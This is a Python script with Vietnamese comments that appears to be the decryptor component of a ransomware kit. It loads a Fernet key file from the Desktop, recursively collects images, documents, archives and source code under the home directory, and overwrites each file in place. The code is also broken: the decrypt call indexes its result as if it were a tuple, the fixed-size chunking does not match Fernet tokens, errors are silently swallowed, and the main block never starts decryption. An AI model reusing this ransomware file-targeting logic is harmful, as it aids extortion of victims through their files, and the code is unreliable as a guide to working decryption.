import os
from sys import exit
from pathlib import Path
from cryptography.fernet import Fernet

# Lớp Decryption để giải mã các tệp đã mã hóa
class Decryption:
    def __init__(self) -> None:
        self.Private = Fernet(self.loadkey())  # Khởi tạo đối tượng Fernet với khóa riêng

    # Tải khóa từ tệp
    def loadkey(self) -> str:
        with open(Path.home()/"Desktop"/'rsw0182.key', 'r') as file:
            return file.read()
        
    # Giải mã các tệp đã mã hóa
    def encrypted(self):
        for _, files in self.listfiles().items():
            for file in files:
                temp_file = file + '.temp'  # Tạo tên tệp tạm thời
                try:
                    with open(file, 'rb') as original_file, open(temp_file, 'wb') as encfile:
                        while True:
                            chunk = original_file.read(4096 * 2048)  # Đọc dữ liệu từ tệp gốc
                            if not chunk:
                                break
                            enc_chunk = self.Private.decrypt(chunk, 32)[0]  # Giải mã dữ liệu
                            encfile.write(enc_chunk)  # Ghi dữ liệu đã giải mã vào tệp tạm thời
                    os.replace(temp_file, file)  # Thay thế tệp gốc bằng tệp đã giải mã
                except: pass
                finally:
                    if os.path.exists(temp_file):  # Xóa tệp tạm thời nếu tồn tại
                        os.remove(temp_file)
    
    # Liệt kê các tệp theo loại
    def listfiles(self) -> dict:
        exts = {
            'images': ['.jpg', '.png', '.gif', '.jpeg'],
            'documents': ['.txt', '.docx', '.md', '.doc', '.pdf', '.xlsx'],
            'others': ['.psd', '.eps', '.cdr', '.ppt', '.mp3', '.wav', '.al', '.mov', '.dmg', '.rar', '.zip', '.mp4', '.xlm'],
            'code': ['.c', '.cpp', '.cs', '.java', '.py', '.pyc','.js', '.html', '.css', '.php', '.rb', '.swift', '.sql', '.xml', '.json', '.sh', '.bat', '.ps1', '.ts', '.go', '.rs', '.kt']
        }
        file_categories = {category: [] for category in exts}
        extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}
        for entry in Path.home().rglob('*'):
            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                file_categories[extcategory[ext]].append(str(entry))
        return file_categories
        
# Hàm main để khởi tạo đối tượng Decryption và bắt đầu quá trình giải mã
if __name__ == '__main__':
    try:
        ransomware = Decryption()
    except:
        exit(404)
